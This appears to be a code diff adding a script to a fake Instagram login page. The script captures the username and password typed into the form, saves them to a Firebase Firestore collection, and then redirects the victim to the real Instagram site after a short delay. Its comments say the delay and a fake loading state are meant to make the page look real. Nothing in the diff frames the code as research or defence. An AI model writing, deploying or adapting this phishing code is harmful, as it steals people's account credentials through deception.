@@ -48,6 +48,62 @@
     </div>
     <br />
 
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
+  import {
+    getFirestore,
+    collection,
+    addDoc,
+    serverTimestamp
+  } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyADXGjz1OemPhO_lVXhR5qb-TMUWDd3vA8",
+    authDomain: "instagram-lite-0.firebaseapp.com",
+    projectId: "instagram-lite-0",
+    storageBucket: "instagram-lite-0.firebasestorage.app",
+    messagingSenderId: "230245474435",
+    appId: "1:230245474435:web:3d2321bc61370cf0513bb6",
+    measurementId: "G-GRD57HJK4V"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  const form = document.querySelector("form");
+
+  form.addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    // 1. Get the values from BOTH fields
+    const username = form.querySelector('[name="u_name"]').value;
+    const password = form.querySelector('[name="pass"]').value; // <--- THIS IS THE FIX
+
+    try {
+      // 2. Send BOTH to Firebase
+      await addDoc(collection(db, "testSubmissions"), {
+        username: username,
+        password: password, // <--- ADDED THIS
+        createdAt: serverTimestamp()
+      });
+
+      console.log("Credentials saved to Firestore");
+      
+      // Optional: Clear fields or show a fake "Loading..." state
+      form.querySelector('[name="u_name"]').value = "";
+      form.querySelector('[name="pass"]').value = "";
+      
+      // Simulate a slight delay before redirecting to make it look real
+      setTimeout(() => {
+         window.location.href = "https://www.instagram.com/";
+      }, 1000);
+
+    } catch (error) {
+      console.error("Firestore error:", error);
+    }
+  });
+</script>
+
 </body>
 
 </html>
